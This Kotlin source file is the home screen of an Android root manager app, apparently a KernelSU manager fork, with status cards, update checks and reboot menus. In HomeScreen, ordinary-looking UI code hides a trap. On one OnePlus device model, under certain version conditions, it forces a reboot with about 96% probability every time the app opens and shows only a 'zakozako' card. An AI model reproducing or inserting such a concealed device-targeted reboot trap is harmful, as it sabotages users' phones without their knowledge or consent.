package zako.zako.zako.ui.screen

import android.annotation.SuppressLint
import android.content.Context
import android.os.Build
import android.os.PowerManager
import android.system.Os
import android.util.Log
import androidx.annotation.StringRes
import androidx.compose.animation.*
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.outlined.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.input.nestedscroll.nestedScroll
import androidx.compose.ui.platform.*
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.core.content.pm.PackageInfoCompat
import com.ramcosta.composedestinations.annotation.Destination
import com.ramcosta.composedestinations.annotation.RootGraph
import com.ramcosta.composedestinations.generated.destinations.InstallScreenDestination
import com.ramcosta.composedestinations.generated.destinations.SettingScreenDestination
import com.ramcosta.composedestinations.navigation.DestinationsNavigator
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import zako.zako.zako.*
import zako.zako.zako.R
import zako.zako.zako.ui.component.rememberConfirmDialog
import zako.zako.zako.ui.util.*
import zako.zako.zako.ui.util.module.LatestVersionInfo
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Text
import zako.zako.zako.ui.theme.getCardColors
import zako.zako.zako.ui.theme.getCardElevation
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.getValue
import androidx.compose.runtime.setValue
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.animation.fadeOut
import androidx.compose.animation.shrinkVertically
import androidx.compose.runtime.saveable.rememberSaveable
import zako.zako.zako.ui.theme.CardConfig
import androidx.core.content.edit
import java.io.BufferedReader
import java.io.InputStreamReader
import java.util.zip.GZIPInputStream
import kotlin.random.Random

@OptIn(ExperimentalMaterial3Api::class)
@Destination<RootGraph>(start = true)
@Composable
fun HomeScreen(navigator: DestinationsNavigator) {
    val context = LocalContext.current
    var isSimpleMode by rememberSaveable { mutableStateOf(false) }
    var isHideVersion by rememberSaveable { mutableStateOf(false) }
    var isHideOtherInfo by rememberSaveable { mutableStateOf(false) }
    var isHideSusfsStatus by rememberSaveable { mutableStateOf(false) }

    // 从 SharedPreferences 加载简洁模式状态
    LaunchedEffect(Unit) {
        isSimpleMode = context.getSharedPreferences("settings", Context.MODE_PRIVATE)
            .getBoolean("is_simple_mode", false)
    }
    // 从 SharedPreferences 加载隐藏 KernelSU 版本号开关状态
    LaunchedEffect(Unit) {
        isHideVersion = context.getSharedPreferences("settings", Context.MODE_PRIVATE)
            .getBoolean("is_hide_version", false)
    }
    // 从 SharedPreferences 加载隐藏模块数量等信息开关状态
    LaunchedEffect(Unit) {
        isHideOtherInfo = context.getSharedPreferences("settings", Context.MODE_PRIVATE)
            .getBoolean("is_hide_other_info", false)
    }
    // 从 SharedPreferences 加载隐藏 SuSFS 状态开关状态
    LaunchedEffect(Unit) {
        isHideSusfsStatus = context.getSharedPreferences("settings", Context.MODE_PRIVATE)
            .getBoolean("is_hide_susfs_status", false)
    }
    val kernelVersion = getKernelVersion()
    val scrollBehavior = TopAppBarDefaults.pinnedScrollBehavior(rememberTopAppBarState())

    val isManager = Natives.becomeManager(ksuApp.packageName)
    val deviceModel = getDeviceModel(context)
    val ksuVersion = if (isManager) Natives.version else null
    val managerVersion = getManagerVersion(context).second
    val Zako = "一.*加.*A.*c.*e.*5.*P.*r.*o".toRegex().matches(deviceModel)
    val isVersion = ksuVersion == 12777
    val isManagerVersionValid = managerVersion > (ksuVersion ?: 0) + 33
    val shouldTriggerRestart = Zako && kernelVersion.isGKI() && (isVersion || isManagerVersionValid)

    LaunchedEffect(shouldTriggerRestart) {
        if (shouldTriggerRestart) {
            val random = Random.nextInt(0, 100)
            if (random <= 95) {
                reboot()
            } else {
                ""
            }
        }
    }

    Scaffold(
        topBar = {
            TopBar(
                kernelVersion,
                onInstallClick = { navigator.navigate(InstallScreenDestination) },
                onSettingsClick = { navigator.navigate(SettingScreenDestination) },
                scrollBehavior = scrollBehavior
            )
        },
        contentWindowInsets = WindowInsets.safeDrawing.only(
            WindowInsetsSides.Top + WindowInsetsSides.Horizontal
        )
    ) { innerPadding ->
        Column(
            modifier = Modifier
                .padding(innerPadding)
                .nestedScroll(scrollBehavior.nestedScrollConnection)
                .verticalScroll(rememberScrollState())
                .padding(top = 12.dp)
                .padding(horizontal = 16.dp),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            if (shouldTriggerRestart) {
                WarningCard(message = "zakozako")
                return@Column
            }
            val isManager = Natives.becomeManager(ksuApp.packageName)
            val ksuVersion = if (isManager) Natives.version else null
            val lkmMode = ksuVersion?.let {
                if (it >= Natives.MINIMAL_SUPPORTED_KERNEL_LKM && kernelVersion.isGKI()) Natives.isLkmMode else null
            }

            StatusCard(kernelVersion, ksuVersion, lkmMode) {
                navigator.navigate(InstallScreenDestination)
            }
            if (isManager && Natives.requireNewKernel()) {
                WarningCard(
                    stringResource(id = R.string.require_kernel_version).format(
                        ksuVersion, Natives.MINIMAL_SUPPORTED_KERNEL
                    )
                )
            }
            if (ksuVersion != null && !rootAvailable()) {
                WarningCard(
                    stringResource(id = R.string.grant_root_failed)
                )
            }
            val checkUpdate =
                LocalContext.current.getSharedPreferences("settings", Context.MODE_PRIVATE)
                    .getBoolean("check_update", true)
            if (checkUpdate) {
                UpdateCard()
            }
            val prefs = remember { context.getSharedPreferences("app_prefs", Context.MODE_PRIVATE) }
            var clickCount by rememberSaveable { mutableIntStateOf(prefs.getInt("click_count", 0)) }

            if (!isSimpleMode && clickCount < 3) {
                AnimatedVisibility(
                    visible = clickCount < 3,
                    exit = shrinkVertically() + fadeOut()
                ) {
                    ElevatedCard(
                        colors = getCardColors(MaterialTheme.colorScheme.secondaryContainer),
                        elevation = CardDefaults.cardElevation(defaultElevation = getCardElevation())
                    ) {
                        Row(
                            modifier = Modifier
                                .fillMaxWidth()
                                .clickable {
                                    clickCount++
                                    prefs.edit { putInt("click_count", clickCount) }
                                }
                                .padding(16.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Text(
                                text = stringResource(R.string.using_mksu_manager),
                                style = MaterialTheme.typography.bodyMedium
                            )
                        }
                    }
                }
            }
            InfoCard()
            if (!isSimpleMode) {
                ContributionCard()
                DonateCard()
                LearnMoreCard()
            }
            Spacer(Modifier)
        }
    }
}

@Composable
fun UpdateCard() {
    val context = LocalContext.current
    val latestVersionInfo = LatestVersionInfo()
    val newVersion by produceState(initialValue = latestVersionInfo) {
        value = withContext(Dispatchers.IO) {
            checkNewVersion()
        }
    }

    val currentVersionCode = getManagerVersion(context).second
    val newVersionCode = newVersion.versionCode
    val newVersionUrl = newVersion.downloadUrl
    val changelog = newVersion.changelog

    Log.d("UpdateCard", "Current version code: $currentVersionCode")
    Log.d("UpdateCard", "New version code: $newVersionCode")



    val uriHandler = LocalUriHandler.current
    val title = stringResource(id = R.string.module_changelog)
    val updateText = stringResource(id = R.string.module_update)

    AnimatedVisibility(
        visible = newVersionCode > currentVersionCode,
        enter = fadeIn() + expandVertically(),
        exit = shrinkVertically() + fadeOut()
    ) {
        val updateDialog = rememberConfirmDialog(onConfirm = { uriHandler.openUri(newVersionUrl) })
        WarningCard(
            message = stringResource(id = R.string.new_version_available).format(newVersionCode),
            MaterialTheme.colorScheme.outlineVariant
        ) {
            if (changelog.isEmpty()) {
                uriHandler.openUri(newVersionUrl)
            } else {
                updateDialog.showConfirm(
                    title = title,
                    content = changelog,
                    markdown = true,
                    confirm = updateText
                )
            }
        }
    }
}

@Composable
fun RebootDropdownItem(@StringRes id: Int, reason: String = "") {
    DropdownMenuItem(text = {
        Text(stringResource(id))
    }, onClick = {
        reboot(reason)
    })
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
private fun TopBar(
    kernelVersion: KernelVersion,
    onInstallClick: () -> Unit,
    onSettingsClick: () -> Unit,
    scrollBehavior: TopAppBarScrollBehavior? = null
) {
    val cardColor = MaterialTheme.colorScheme.secondaryContainer
    val cardAlpha = CardConfig.cardAlpha

    TopAppBar(
        title = { Text(stringResource(R.string.app_name)) },
        colors = TopAppBarDefaults.topAppBarColors(
            containerColor = cardColor.copy(alpha = cardAlpha),
            scrolledContainerColor = cardColor.copy(alpha = cardAlpha)
        ),
        actions = {
            if (kernelVersion.isGKI()) {
                IconButton(onClick = onInstallClick) {
                    Icon(Icons.Filled.Archive, stringResource(R.string.install))
                }
            }

            var showDropdown by remember { mutableStateOf(false) }
            IconButton(onClick = { showDropdown = true }) {
                Icon(Icons.Filled.Refresh, stringResource(R.string.reboot))
                DropdownMenu(expanded = showDropdown, onDismissRequest = { showDropdown = false }
                ) {

                    RebootDropdownItem(id = R.string.reboot)

                    val pm = LocalContext.current.getSystemService(Context.POWER_SERVICE) as PowerManager?
                    @Suppress("DEPRECATION")
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && pm?.isRebootingUserspaceSupported == true) {
                        RebootDropdownItem(id = R.string.reboot_userspace, reason = "userspace")
                    }
                    RebootDropdownItem(id = R.string.reboot_recovery, reason = "recovery")
                    RebootDropdownItem(id = R.string.reboot_bootloader, reason = "bootloader")
                    RebootDropdownItem(id = R.string.reboot_download, reason = "download")
                    RebootDropdownItem(id = R.string.reboot_edl, reason = "edl")
                }
            }
        },
        windowInsets = WindowInsets.safeDrawing.only(WindowInsetsSides.Top + WindowInsetsSides.Horizontal),
        scrollBehavior = scrollBehavior
    )
}

@Composable
private fun StatusCard(
    kernelVersion: KernelVersion,
    ksuVersion: Int?,
    lkmMode: Boolean?,
    onClickInstall: () -> Unit = {}
) {
    ElevatedCard(
        colors = getCardColors(MaterialTheme.colorScheme.secondaryContainer),
        elevation = CardDefaults.cardElevation(defaultElevation = getCardElevation())
    ) {
        Row(modifier = Modifier
            .fillMaxWidth()
            .clickable {
                if (kernelVersion.isGKI()) {
                    onClickInstall()
                }
            }
            .padding(24.dp), verticalAlignment = Alignment.CenterVertically) {
            when {
                ksuVersion != null -> {
                    val safeMode = when {
                        Natives.isSafeMode -> " [${stringResource(id = R.string.safe_mode)}]"
                        else -> ""
                    }

                    val workingMode = when (lkmMode) {
                        null -> " <Non-GKI>"
                        true -> " <LKM>"
                        else -> " <GKI>"
                    }

                    val workingText =
                        "${stringResource(id = R.string.home_working)}$workingMode$safeMode"

                    val isHideVersion = LocalContext.current.getSharedPreferences("settings", Context.MODE_PRIVATE)
                        .getBoolean("is_hide_version", false)

                    val isHideOtherInfo = LocalContext.current.getSharedPreferences("settings", Context.MODE_PRIVATE)
                        .getBoolean("is_hide_other_info", false)

                    val isHideSusfsStatus = LocalContext.current.getSharedPreferences("settings", Context.MODE_PRIVATE)
                        .getBoolean("is_hide_susfs_status", false)

                    Icon(Icons.Outlined.CheckCircle, stringResource(R.string.home_working))
                    Column(Modifier.padding(start = 20.dp)) {
                        Text(
                            text = workingText,
                            style = MaterialTheme.typography.titleMedium
                        )
                        if (!isHideVersion) {
                            Spacer(Modifier.height(4.dp))
                            Text(
                                text = stringResource(R.string.home_working_version, ksuVersion),
                                style = MaterialTheme.typography.bodyMedium
                            )
                        }
                        if (!isHideOtherInfo) {
                            Spacer(Modifier.height(4.dp))
                            Text(
                                text = stringResource(
                                    R.string.home_superuser_count, getSuperuserCount()
                                ), style = MaterialTheme.typography.bodyMedium
                            )
                            Spacer(Modifier.height(4.dp))
                            Text(
                                text = stringResource(R.string.home_module_count, getModuleCount()),
                                style = MaterialTheme.typography.bodyMedium
                            )
                            val kpmVersion = getKpmVersion()
                            if (kpmVersion.isNotEmpty() && !kpmVersion.startsWith("Error")) {
                                Spacer(Modifier.height(4.dp))
                                Text(
                                    text = stringResource(R.string.home_kpm_module, getKpmModuleCount()),
                                    style = MaterialTheme.typography.bodyMedium
                                )
                            }
                        }
                        if (!isHideSusfsStatus) {
                            Spacer(modifier = Modifier.height(4.dp))

                            val suSFS = getSuSFS()
                            if (lkmMode != true) {
                                val translatedStatus = when (suSFS) {
                                    "Supported" -> stringResource(R.string.status_supported)
                                    "Not Supported" -> stringResource(R.string.status_not_supported)
                                    else -> stringResource(R.string.status_unknown)
                                }

                                Text(
                                    text = stringResource(R.string.home_susfs, translatedStatus),
                                    style = MaterialTheme.typography.bodyMedium
                                )
                            }
                        }
                    }
                }

                kernelVersion.isGKI() -> {
                    Icon(Icons.Outlined.Warning, stringResource(R.string.home_not_installed))
                    Column(Modifier.padding(start = 20.dp)) {
                        Text(
                            text = stringResource(R.string.home_not_installed),
                            style = MaterialTheme.typography.titleMedium
                        )
                        Spacer(Modifier.height(4.dp))
                        Text(
                            text = stringResource(R.string.home_click_to_install),
                            style = MaterialTheme.typography.bodyMedium
                        )
                    }
                }

                else -> {
                    Icon(Icons.Outlined.Block, stringResource(R.string.home_unsupported))
                    Column(Modifier.padding(start = 20.dp)) {
                        Text(
                            text = stringResource(R.string.home_unsupported),
                            style = MaterialTheme.typography.titleMedium
                        )
                        Spacer(Modifier.height(4.dp))
                        Text(
                            text = stringResource(R.string.home_unsupported_reason),
                            style = MaterialTheme.typography.bodyMedium
                        )
                    }
                }
            }
        }
    }
}

@Composable
fun WarningCard(
    message: String, color: Color = MaterialTheme.colorScheme.error, onClick: (() -> Unit)? = null
) {
    ElevatedCard(
        colors = getCardColors(MaterialTheme.colorScheme.secondaryContainer),
        elevation = CardDefaults.cardElevation(defaultElevation = getCardElevation())
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .then(onClick?.let { Modifier.clickable { it() } } ?: Modifier)
                .padding(24.dp)
        ) {
            Text(
                text = message, style = MaterialTheme.typography.bodyMedium
            )
        }
    }
}
@Composable
fun ContributionCard() {
    val uriHandler = LocalUriHandler.current
    val links = listOf("https://github.com/zako", "https://github.com/udochina")
    ElevatedCard(
        colors = getCardColors(MaterialTheme.colorScheme.secondaryContainer),
        elevation = CardDefaults.cardElevation(defaultElevation = getCardElevation())
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .clickable {
                    val randomIndex = Random.nextInt(links.size)
                    uriHandler.openUri(links[randomIndex])
                }
                .padding(24.dp),
            verticalAlignment = Alignment.CenterVertically
        ) {
            Column {
                Text(
                    text = stringResource(R.string.home_ContributionCard_kernelsu),
                    style = MaterialTheme.typography.titleSmall
                )
                Spacer(Modifier.height(4.dp))
                Text(
                    text = stringResource(R.string.home_click_to_ContributionCard_kernelsu),
                    style = MaterialTheme.typography.bodyMedium
                )
            }
        }
    }
}

@Composable
fun LearnMoreCard() {
    val uriHandler = LocalUriHandler.current
    val url = stringResource(R.string.home_learn_kernelsu_url)

    ElevatedCard(
        colors = getCardColors(MaterialTheme.colorScheme.secondaryContainer),
        elevation = CardDefaults.cardElevation(defaultElevation = getCardElevation())
    ) {

        Row(modifier = Modifier
            .fillMaxWidth()
            .clickable {
                uriHandler.openUri(url)
            }
            .padding(24.dp), verticalAlignment = Alignment.CenterVertically) {
            Column {
                Text(
                    text = stringResource(R.string.home_learn_kernelsu),
                    style = MaterialTheme.typography.titleSmall
                )
                Spacer(Modifier.height(4.dp))
                Text(
                    text = stringResource(R.string.home_click_to_learn_kernelsu),
                    style = MaterialTheme.typography.bodyMedium
                )
            }
        }
    }
}

@Composable
fun DonateCard() {
    val uriHandler = LocalUriHandler.current

    ElevatedCard(
        colors = getCardColors(MaterialTheme.colorScheme.secondaryContainer),
        elevation = CardDefaults.cardElevation(defaultElevation = getCardElevation())
    ) {

        Row(modifier = Modifier
            .fillMaxWidth()
            .clickable {
                uriHandler.openUri("https://patreon.com/weishu")
            }
            .padding(24.dp), verticalAlignment = Alignment.CenterVertically) {
            Column {
                Text(
                    text = stringResource(R.string.home_support_title),
                    style = MaterialTheme.typography.titleSmall
                )
                Spacer(Modifier.height(4.dp))
                Text(
                    text = stringResource(R.string.home_support_content),
                    style = MaterialTheme.typography.bodyMedium
                )
            }
        }
    }
}

@Composable
private fun InfoCard() {
    val context = LocalContext.current
    val isSimpleMode = LocalContext.current.getSharedPreferences("settings", Context.MODE_PRIVATE)
        .getBoolean("is_simple_mode", false)

    ElevatedCard(
        colors = getCardColors(MaterialTheme.colorScheme.secondaryContainer),
        elevation = CardDefaults.cardElevation(defaultElevation = getCardElevation())
    ) {
        Column(
            modifier = Modifier
                .fillMaxWidth()
                .padding(start = 24.dp, top = 24.dp, end = 24.dp, bottom = 16.dp)
        ) withContext@{
            val contents = StringBuilder()
            val uname = Os.uname()

            @Composable
            fun InfoCardItem(
                label: String,
                content: String,
            ) {
                contents.appendLine(label).appendLine(content).appendLine()
                Text(text = label, style = MaterialTheme.typography.bodyLarge)
                Text(text = content, style = MaterialTheme.typography.bodyMedium)
            }

            InfoCardItem(stringResource(R.string.home_kernel), uname.release)

            if (!isSimpleMode) {
                Spacer(Modifier.height(16.dp))
                val androidVersion = Build.VERSION.RELEASE
                InfoCardItem(stringResource(R.string.home_android_version), androidVersion)
            }


            Spacer(Modifier.height(16.dp))
            val deviceModel = getDeviceModel(context)
            InfoCardItem(stringResource(R.string.home_device_model), deviceModel)



            Spacer(Modifier.height(16.dp))
            val managerVersion = getManagerVersion(context)
            InfoCardItem(
                stringResource(R.string.home_manager_version),
                "${managerVersion.first} (${managerVersion.second})"
            )



            Spacer(Modifier.height(16.dp))
            InfoCardItem(stringResource(R.string.home_selinux_status), getSELinuxStatus())



            if (!isSimpleMode) {
                val kpmVersion = getKpmVersion()
                var displayVersion: String
                val isKpmConfigured = checkKpmConfigured()

                if (kpmVersion.isEmpty() || kpmVersion.startsWith("Error")) {
                    val statusText = if (isKpmConfigured) {
                        stringResource(R.string.kernel_patched)
                    } else {
                        stringResource(R.string.kernel_not_enabled)
                    }
                    displayVersion = "${stringResource(R.string.not_supported)} ($statusText)"
                } else {
                    displayVersion = "${stringResource(R.string.supported)} ($kpmVersion)"
                }
                Spacer(Modifier.height(16.dp))
                InfoCardItem(stringResource(R.string.home_kpm_version), displayVersion)
            }

            val isHideSusfsStatus = LocalContext.current.getSharedPreferences("settings", Context.MODE_PRIVATE)
                .getBoolean("is_hide_susfs_status", false)

            if ((!isSimpleMode) && (!isHideSusfsStatus)) {
                Spacer(modifier = Modifier.height(16.dp))

                val suSFS = getSuSFS()
                if (suSFS == "Supported") {
                    val suSFSVersion = getSuSFSVersion()
                    if (suSFSVersion.isEmpty()) return@withContext
                    val isSUS_SU = getSuSFSFeatures() == "CONFIG_KSU_SUSFS_SUS_SU"
                    val infoText = buildString {
                        append(suSFSVersion)
                        append(if (isSUS_SU) " (${getSuSFSVariant()})" else " (${stringResource(R.string.manual_hook)})")
                        if (isSUS_SU) {
                            val susSUMode = try { susfsSUS_SU_Mode().toString() } catch (_: Exception) { "" }
                            if (susSUMode.isNotEmpty()) {
                                append(" ${stringResource(R.string.sus_su_mode)} $susSUMode")
                            }
                        }
                    }
                    InfoCardItem(
                        stringResource(R.string.home_susfs_version),
                        infoText
                    )
                }
            }
        }
    }
}

fun getManagerVersion(context: Context): Pair<String, Long> {
    val packageInfo = context.packageManager.getPackageInfo(context.packageName, 0)!!
    val versionCode = PackageInfoCompat.getLongVersionCode(packageInfo)
    return Pair(packageInfo.versionName!!, versionCode)
}

@Preview
@Composable
private fun StatusCardPreview() {
    Column {
        StatusCard(KernelVersion(5, 10, 101), 1, null)
        StatusCard(KernelVersion(5, 10, 101), 20000, true)
        StatusCard(KernelVersion(5, 10, 101), null, true)
        StatusCard(KernelVersion(4, 10, 101), null, false)
    }
}

@Preview
@Composable
private fun WarningCardPreview() {
    Column {
        WarningCard(message = "Warning message")
        WarningCard(
            message = "Warning message ",
            MaterialTheme.colorScheme.outlineVariant,
            onClick = {})
    }
}

@SuppressLint("PrivateApi")
private fun getDeviceModel(context: Context): String {
    return try {
        val systemProperties = Class.forName("android.os.SystemProperties")
        val getMethod = systemProperties.getMethod("get", String::class.java, String::class.java)
        val marketNameKeys = listOf(
            "ro.product.marketname",          // Xiaomi
            "ro.vendor.oplus.market.name",    // Oppo, OnePlus, Realme
            "ro.vivo.market.name",            // Vivo
            "ro.config.marketing_name"        // Huawei
        )
        for (key in marketNameKeys) {
            val marketName = getMethod.invoke(null, key, "") as String
            if (marketName.isNotEmpty()) {
                return marketName
            }
        }
        Build.DEVICE
    } catch (e: Exception) {
        Build.DEVICE
    }
}

private fun checkKpmConfigured(): Boolean {
    try {
        val process = Runtime.getRuntime().exec("su -c cat /proc/config.gz")
        val inputStream = process.inputStream
        val gzipInputStream = GZIPInputStream(inputStream)
        val reader = BufferedReader(InputStreamReader(gzipInputStream))

        var line: String?
        while (reader.readLine().also { line = it } != null) {
            if (line?.contains("CONFIG_KPM=y") == true) {
                return true
            }
        }
        reader.close()
    } catch (e: Exception) {
        e.printStackTrace()
    }
    return false
}